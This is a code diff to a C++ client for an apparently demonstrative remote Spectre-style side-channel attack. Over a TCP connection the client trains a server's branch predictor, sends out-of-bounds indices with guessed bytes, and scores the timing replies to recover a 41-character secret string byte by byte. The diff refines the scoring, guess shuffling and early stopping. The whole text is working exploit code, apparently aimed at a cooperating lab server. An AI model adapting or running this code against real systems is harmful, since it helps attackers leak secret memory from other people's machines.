@@ -4,7 +4,6 @@
 #include <iostream>
 #include <random>
 #include <sched.h>
-#include <thread>
 #include <x86intrin.h>
 
 using boost::asio::ip::tcp;
@@ -39,61 +38,88 @@ Results computeResults(int64_t numSamples) {
 }
 */
 
-char getRemoteResults(tcp::socket &s, uint64_t samplePoint, size_t waitTime,
-                      int64_t numSamples) {
+std::array<uint8_t, 256> byteTestedOrder;
+
+char getRemoteResult(tcp::socket &s, uint64_t samplePoint, size_t waitTime,
+                     int64_t numSamples) {
   std::random_device random{};
+  std::mt19937 genRand{random()};
 
   auto scores = std::array<uint32_t, 256>();
-  for (int i = 0; i < 256; i++) {
-    scores[i] = 0;
+  for (auto &score : scores) {
+    score = 0;
   }
 
+  int candidate1;
+  int candidate2;
+
   for (int sample = 0; sample < numSamples; sample++) {
-    auto localTimes = std::array<uint32_t, 256>{};
-    // train the branch predictor
-    uint64_t a = 0;
-    int64_t totalTraining = (random() % 2) + 5;
-    for (int i = 0; i < totalTraining; i++) {
-      boost::asio::write(s, boost::asio::buffer(&a, sizeof(a)));
+    std::shuffle(std::begin(byteTestedOrder), std::end(byteTestedOrder),
+                 genRand);
+    for (int byteTested : byteTestedOrder) {
+      auto localTimes = uint32_t{};
+      // train the branch predictor
+      struct {
+        uint64_t a;
+        uint64_t b;
+      } data;
+      int64_t totalTraining = (genRand() % 2) + 10;
+      for (int i = 0; i < totalTraining; i++) {
+        data.a = 0;
+        data.b = genRand() % 256;
+        boost::asio::write(s, boost::asio::buffer(&data, sizeof(data)));
+        boost::asio::read(s,
+                          boost::asio::buffer(&localTimes, sizeof(localTimes)));
+      }
+
+      // attack
+      /*std::chrono::high_resolution_clock::time_point start, end;
+      start = std::chrono::high_resolution_clock::now();*/
+      data.a = samplePoint;
+      data.b = byteTested;
+      boost::asio::write(s, boost::asio::buffer(&data, sizeof(data)));
       boost::asio::read(s,
                         boost::asio::buffer(&localTimes, sizeof(localTimes)));
+      // end = std::chrono::high_resolution_clock::now();
+      // samples[sample] = reply;
+
+      /*if (byteTested == 'f') {
+        std::cout << "F: " << localTimes << "\n";
+      }*/
+      if (localTimes < 120) {
+        scores[byteTested] += 1;
+      }
+      // std::this_thread::sleep_for(std::chrono::milliseconds(waitTime));
     }
 
-    // attack
-    /*std::chrono::high_resolution_clock::time_point start, end;
-    start = std::chrono::high_resolution_clock::now();*/
-    boost::asio::write(s,
-                       boost::asio::buffer(&samplePoint, sizeof(samplePoint)));
-    boost::asio::read(s, boost::asio::buffer(&localTimes, sizeof(localTimes)));
-    // end = std::chrono::high_resolution_clock::now();
-    // samples[sample] = reply;
-
-    for (int i = 0; i < 256; i++) {
-      if (localTimes[i] < 80) {
-        scores[i] += 1;
+    candidate1 = -1;
+    candidate2 = -1;
+    for (int i = 0; i < scores.size(); i++) {
+      if (candidate1 < 0 || scores[i] >= scores[candidate1]) {
+        candidate2 = candidate1;
+        candidate1 = i;
+      } else if (candidate2 < 0 || scores[i] >= scores[candidate2]) {
+        candidate2 = i;
       }
     }
 
-    // std::this_thread::sleep_for(std::chrono::milliseconds(waitTime));
-  }
-
-  int j = -1, k = -1;
-  for (int i = 0; i < 256; i++) {
-    if (j < 0 || scores[i] >= scores[j]) {
-      k = j;
-      j = i;
-    } else if (k < 0 || scores[i] >= scores[k]) {
-      k = i;
+    if (scores[candidate1] > 0 &&
+        scores[candidate1] >= scores[candidate2] + 10) {
+      break;
     }
   }
 
-  std::cout << "Best guess: " << char(j) << " (" << scores[j] << ")\n";
+  std::cout << "Best guess: " << char(candidate1) << " (" << candidate1 << " "
+            << scores[candidate1] << ")";
 
-  if (scores[j] > 0) {
-    std::cout << "Runner-up: " << char(k) << " (" << scores[k] << ")\n";
+  if (scores[candidate2] > 0) {
+    std::cout << " Runner-up: " << char(candidate2) << " (" << candidate2 << " "
+              << scores[candidate2] << ")\n";
+  } else {
+    std::cout << "\n";
   }
 
-  return j;
+  return candidate1;
 }
 
 int main(int argc, char *argv[]) {
@@ -112,6 +138,10 @@ int main(int argc, char *argv[]) {
     }
 
     boost::asio::io_context io_context;
+
+    for (int i = 0; i < 256; ++i) {
+      byteTestedOrder[i] = i;
+    }
 
     tcp::socket s(io_context);
     tcp::resolver resolver(io_context);
@@ -143,9 +173,8 @@ int main(int argc, char *argv[]) {
 
     std::string result;
     // Numbers chosen so we only look at the secret string
-    for (uint64_t i = 18446744073709518176u; i < 18446744073709518176u + 41;
-         i++) {
-      result.push_back(getRemoteResults(s, i, waitTime, numSamples));
+    for (uint64_t i = 160u; i < 160u + 41; i++) {
+      result.push_back(getRemoteResult(s, i, waitTime, numSamples));
     }
     std::cout << "Result: " << result << "\n";
 
